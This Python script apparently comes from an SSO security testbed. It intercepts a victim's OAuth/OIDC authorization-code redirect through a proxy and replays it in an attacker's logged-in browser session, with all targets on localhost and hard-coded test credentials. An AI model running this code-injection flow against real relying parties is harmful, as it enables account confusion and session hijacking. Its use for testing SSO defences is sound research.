import sys
import os
import time

sys.path.append(os.path.join(os.path.dirname(__file__), '../../src'))

from browser import BrowserSimulator
from proxy import ProxyClient
import id_token

ATTACKER_IDP_ENDPOINT = "http://localhost:9997"
HONEST_RP_ENDPOINT = "http://localhost:9999"
PROXY_SERVER_ENDPOINT = "http://localhost:8080"
PROXY_EXTENSION_ENDPOINT = "http://localhost:5555"

proxy_client = ProxyClient(PROXY_EXTENSION_ENDPOINT)

# victim credentials
victim_username = 'test-user@localhost'
victim_password = 'verysecure'

# attacker credentials
attacker_username = 'test-user2'
attacker_password = 'verysecure'

try:
    # add intercept rule
    proxy_client.intercept_response(f"{HONEST_RP_ENDPOINT}/auth/callback?code=")
    
    # login with victim account
    sso_flow = f"""
page.locator('input[name="username"]').fill('{victim_username}')
page.locator('input[name="password"]').fill('{victim_password}')
page.locator('button[type="submit"]').click()
print(page.content())
    """
    simulator1 = BrowserSimulator(f'{HONEST_RP_ENDPOINT}/login', PROXY_SERVER_ENDPOINT)
    simulator1.run(sso_flow)
    simulator1.close()

    # replace location header
    traces = proxy_client.get_history()
    print("=====================================")
    for res in traces['response']:
        for name, value in res['headers'].items():
            if name == 'Location':
                location = value
    
    proxy_client.clean()

    # login with attacker account
    sso_flow = f"""
page.locator('input[name="username"]').fill('{attacker_username}')
page.locator('input[name="password"]').fill('{attacker_password}')
page.locator('button[type="submit"]').click()
print(page.content())
    """
    simulator2 = BrowserSimulator(f'{HONEST_RP_ENDPOINT}/login', PROXY_SERVER_ENDPOINT)
    simulator2.run(sso_flow)

    # visit location
    print("location:", location)
    simulator2.visit(location)
    print("content:", simulator2.get_content())
    simulator2.close()

except Exception as e:
    print('Error:', e)
    proxy_client.clean()